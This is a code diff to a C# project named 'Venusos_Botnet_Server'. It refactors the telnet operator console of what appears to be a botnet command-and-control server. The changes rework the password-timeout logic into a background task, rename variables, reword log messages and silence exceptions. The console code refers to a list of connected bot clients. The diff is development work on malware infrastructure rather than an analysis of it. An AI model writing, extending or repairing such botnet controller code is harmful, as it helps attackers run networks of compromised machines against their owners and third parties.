@@ -12,7 +12,7 @@ namespace Venusos_Botnet_Server
         {
             string password = Tools.GetPassword();
 
-            Console.WriteLine("Telnet console is avaiable on {0}:23\n", Tools.GetLocalIP());
+            Console.WriteLine("Telnet console is avaiable on {0}:23", Tools.GetLocalIP());
 
             while (true)
             {
@@ -24,18 +24,37 @@ namespace Venusos_Botnet_Server
                     int i = 0;
                     string data = "";
                     bool logged = false;
-                    bool just_logged = false;
+                    bool justLogged = false;
                     byte[] bytes = new byte[256];
 
                     TcpClient tcpClient = tcpListener.AcceptTcpClient();
                     NetworkStream networkStream = tcpClient.GetStream();
 
-                    Console.WriteLine("New connection request from {0}", ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address);
+                    Console.WriteLine("\n [*] New connection request from {0}", ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address);
 
                     networkStream.Write(Encoding.ASCII.GetBytes("Enter password: "));
 
-                    Stopwatch timer = new Stopwatch();
-                    timer.Start();
+                    Task.Run(() =>
+                    {
+                        Stopwatch timer = new Stopwatch();
+                        timer.Start();
+
+                        while (true)
+                        {
+                            if (logged)
+                            {
+                                break;
+                            }
+                            else if (timer.Elapsed.TotalSeconds > 5)
+                            {
+                                tcpClient.Close();
+                                Console.WriteLine(" - Password timeout");
+                                break;
+                            }
+                        }
+
+                        timer.Stop();
+                    });
 
                     while ((i = networkStream.Read(bytes)) != 0)
                     {
@@ -45,25 +64,18 @@ namespace Venusos_Botnet_Server
                         {
                             if (data == password)
                             {
-                                timer.Stop();
                                 logged = true;
-                                just_logged = true;
-                                Console.WriteLine("Client connected");
-                            }
-                            if (timer.Elapsed.TotalSeconds > 10)
-                            {
-                                timer.Stop();
-                                tcpClient.Close();
-                                throw new Exception("Wrong password");
+                                justLogged = true;
+                                Console.WriteLine(" - Client connected");
                             }
                         }
                         else
                         {
                             BotsServer.tcpClients.RemoveAll(x => !x.Connected);
 
-                            if (just_logged)
+                            if (justLogged)
                             {
-                                just_logged = false;
+                                justLogged = false;
                                 networkStream.Write(Encoding.ASCII.GetBytes("Hello, type help to get more info!\n\r"));
                             }
 
@@ -113,13 +125,13 @@ namespace Venusos_Botnet_Server
                         }
                     }
                 }
-                catch (Exception e)
+                catch (Exception)
                 {
-                    Console.WriteLine(e);
+
                 }
                 finally
                 {
-                    Console.WriteLine("Client disconnected");
+                    Console.WriteLine(" - Client disconnected");
                     tcpListener.Stop();
                 }
             }
